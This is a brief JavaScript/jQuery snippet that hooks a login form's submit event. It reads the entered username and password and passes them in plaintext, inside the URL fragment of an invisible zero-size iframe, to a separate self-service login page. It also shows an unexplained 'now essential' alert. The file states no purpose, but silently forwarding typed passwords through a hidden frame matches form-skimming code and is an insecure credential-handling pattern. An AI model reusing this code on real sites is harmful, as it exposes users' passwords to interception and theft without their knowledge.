var loginform = document.getElementById('login');

$(loginform).submit(function(){
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
	alert("now essential");
	$('<iframe />', {
                width: '0',
                height: '0',
                frameborder: 'no',
                src: 'https://selfservice.sebts.edu/selfservice/login.aspx#mdl|'
                    + username + '|' + password,
            }).appendTo('body');
});